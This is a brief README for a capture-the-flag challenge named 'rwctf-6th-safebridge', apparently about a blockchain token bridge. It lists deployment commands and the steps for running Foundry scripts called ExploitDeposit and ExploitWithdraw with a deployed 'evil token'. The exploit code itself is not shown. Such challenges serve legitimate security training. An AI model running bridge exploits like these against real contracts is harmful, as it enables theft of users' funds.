# rwctf-6th-safebridge

## Deployment

```bash
./deploy.sh
nc 127.0.0.1 1337
```

## Exploit

```bash
cd project
npm i
export L1_RPC="your l1 rpc endpoint"
export L2_RPC="your l2 rpc endpoint"
export CHALLENGE="your challenge contract"
forge script ExploitDeposit --broadcast --private-key "your private key" -vvvv
export EVILTOKEN="evil token you deployed with previous command"
forge script ExploitWithdraw --broadcast --private-key "your private key" -vvvv
```
